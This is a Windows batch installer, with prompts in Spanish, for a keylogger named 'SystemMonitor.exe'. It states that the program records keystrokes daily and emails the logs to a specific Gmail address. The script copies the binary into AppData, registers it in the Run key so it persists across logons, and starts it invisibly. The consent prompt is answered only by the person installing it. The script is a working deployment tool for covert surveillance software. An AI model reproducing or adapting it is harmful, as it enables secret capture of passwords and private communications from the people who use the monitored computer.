@echo off
setlocal enabledelayedexpansion
chcp 65001 >nul
color 0B

echo.
echo ╔════════════════════════════════════════════════════════╗
echo ║     INSTALADOR - MONITOR DE SISTEMA (Inicio Auto)     ║
echo ╚════════════════════════════════════════════════════════╝
echo.

REM ========================================
REM Mostrar Política de Privacidad
REM ========================================
echo ╔════════════════════════════════════════════════════════╗
echo ║          POLÍTICA DE PRIVACIDAD Y CONSENTIMIENTO       ║
echo ╚════════════════════════════════════════════════════════╝
echo.
echo Este software realizará las siguientes acciones:
echo.
echo 📝 RECOPILACIÓN DE DATOS:
echo    • Registra las teclas presionadas en este equipo
echo    • Captura horario: 06:00 AM - 08:00 PM
echo    • Almacena registros localmente
echo.
echo 📧 ENVÍO DE INFORMACIÓN:
echo    • Envía registros diarios automáticamente
echo    • Hora de envío: 3:00 PM (15:00)
echo    • Destino: yarokasas@gmail.com
echo.
echo 🔒 SEGURIDAD Y PRIVACIDAD:
echo    • Los datos se almacenan cifrados localmente
echo    • Se eliminan registros después de 7 días
echo    • Uso exclusivo para monitoreo autorizado
echo.
echo ⚠️  IMPORTANTE:
echo    • Este equipo será monitoreado continuamente
echo    • Al continuar, acepta los términos descritos
echo    • Solo instale si tiene autorización para hacerlo
echo.
echo ════════════════════════════════════════════════════════
echo.
echo ¿Acepta la política de privacidad y recopilación de datos?
echo.
set /p ACEPTA="Escriba 'ACEPTO' para continuar (o 'N' para cancelar): "

if /i not "%ACEPTA%"=="ACEPTO" (
    echo.
    echo ❌ Instalación cancelada.
    echo    No se aceptaron los términos de privacidad.
    echo.
    pause
    exit /b 0
)

echo.
echo ✓ Política aceptada. Continuando con la instalación...
echo.
timeout /t 2 /nobreak >nul

REM ========================================
REM Detectar arquitectura del sistema
REM ========================================
if "%PROCESSOR_ARCHITECTURE%"=="AMD64" (
    set "ARCH=64-bit"
) else if "%PROCESSOR_ARCHITECTURE%"=="x86" (
    if defined PROCESSOR_ARCHITEW6432 (
        set "ARCH=64-bit"
    ) else (
        set "ARCH=32-bit"
    )
) else (
    set "ARCH=64-bit"
)
echo 💻 Sistema detectado: Windows %ARCH%
echo.

REM Verificar permisos de administrador
net session >nul 2>&1
if errorlevel 1 (
    echo ⚠ ADVERTENCIA: Se recomienda ejecutar como Administrador
    echo.
    echo ¿Continuar de todas formas? (S/N^)
    set /p CONTINUAR=
    if /i not "!CONTINUAR!"=="S" exit /b 0
    echo.
)

REM ========================================
REM Verificar que existe el ejecutable
REM ========================================
echo [1/4] Verificando archivos...

REM Buscar ejecutable
set "EXE_PATH="
set "EXE_FOUND=0"

if exist "%~dp0SystemMonitor.exe" (
    set "EXE_PATH=%~dp0SystemMonitor.exe"
    set "EXE_FOUND=1"
    echo    ✓ Encontrado: SystemMonitor.exe
)

if "%EXE_FOUND%"=="0" (
    if exist "%~dp0dist\SystemMonitor.exe" (
        set "EXE_PATH=%~dp0dist\SystemMonitor.exe"
        set "EXE_FOUND=1"
        echo    ✓ Encontrado: dist\SystemMonitor.exe
    )
)

if "%EXE_FOUND%"=="0" (
    echo.
    echo ❌ ERROR: No se encuentra SystemMonitor.exe
    echo.
    echo 📁 Ubicaciones buscadas:
    echo    • %~dp0SystemMonitor.exe
    echo    • %~dp0dist\SystemMonitor.exe
    echo.
    pause
    exit /b 1
)

for %%A in ("%EXE_PATH%") do set SIZE=%%~zA
set /a SIZE_MB=!SIZE! / 1048576
echo    📦 Tamaño: !SIZE_MB! MB
echo.

REM ========================================
REM Crear directorio de instalación
REM ========================================
echo [2/4] Preparando instalación...

set "INSTALL_DIR=%APPDATA%\SystemMonitor"

if exist "%INSTALL_DIR%" (
    echo    ⚠ Directorio existente, limpiando...
    taskkill /F /IM SystemMonitor.exe >nul 2>&1
    timeout /t 2 /nobreak >nul
    rmdir /S /Q "%INSTALL_DIR%" 2>nul
)

mkdir "%INSTALL_DIR%" 2>nul

echo    ✓ Directorio creado: %INSTALL_DIR%
echo.

REM ========================================
REM Copiar archivos
REM ========================================
echo [3/4] Copiando archivos...

copy /Y "%EXE_PATH%" "%INSTALL_DIR%\SystemMonitor.exe" >nul

if errorlevel 1 (
    echo.
    echo ❌ ERROR: No se pudo copiar el ejecutable
    pause
    exit /b 1
)

echo    ✓ Ejecutable copiado
echo.

REM ========================================
REM Configurar inicio automático
REM ========================================
echo [4/4] Configurando inicio automático...

reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemMonitor" /f >nul 2>&1

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemMonitor" /t REG_SZ /d "\"%INSTALL_DIR%\SystemMonitor.exe\"" /f >nul

if errorlevel 1 (
    echo    ⚠ No se pudo agregar al inicio automático
    echo.
) else (
    echo    ✓ Inicio automático configurado
    echo.
)

REM ========================================
REM Iniciar el monitor
REM ========================================
echo Iniciando monitor en segundo plano...

start "" "%INSTALL_DIR%\SystemMonitor.exe"

timeout /t 3 /nobreak >nul

tasklist /FI "IMAGENAME eq SystemMonitor.exe" 2>NUL | find /I /N "SystemMonitor.exe">NUL
if "%ERRORLEVEL%"=="0" (
    echo    ✓ Monitor iniciado correctamente
) else (
    echo    ⚠ El monitor puede estar iniciándose...
)

echo.
echo ╔════════════════════════════════════════════════════════╗
echo ║              ✓ INSTALACIÓN COMPLETADA                 ║
echo ╚════════════════════════════════════════════════════════╝
echo.
echo 📍 Ubicación: %INSTALL_DIR%
echo.
echo ✅ ESTADO:
echo    • Monitor ejecutándose (invisible)
echo    • Inicio automático: ACTIVADO
echo    • Captura: 06:00 - 20:00
echo    • Envío diario: 15:00 (3 PM)
echo    • Política: ACEPTADA
echo.
echo 📝 ARCHIVOS CREADOS:
echo    • SystemMonitor.exe      (programa)
echo    • logs\log_YYYY-MM-DD.dat (registros por día)
echo    • config.dat             (configuración)
echo.
echo 🗑️ DESINSTALAR:
echo    • Ejecuta: desinstalar.bat
echo.
pause